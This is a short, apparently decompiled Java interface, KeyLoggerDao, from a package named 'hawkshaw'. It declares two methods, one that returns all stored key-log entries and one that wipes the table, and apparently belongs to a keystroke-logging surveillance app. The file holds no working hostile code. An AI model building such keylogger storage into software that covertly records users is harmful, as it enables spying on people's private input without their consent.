package com.hawkshaw.library.datalayer.room.keylogger;

import a3.e;
import com.hawkshaw.library.datalayer.room.BaseDao;

public interface KeyLoggerDao extends BaseDao<KeyLogEntity> {
    Object getAll(e eVar);

    Object nukeTable(e eVar);
}
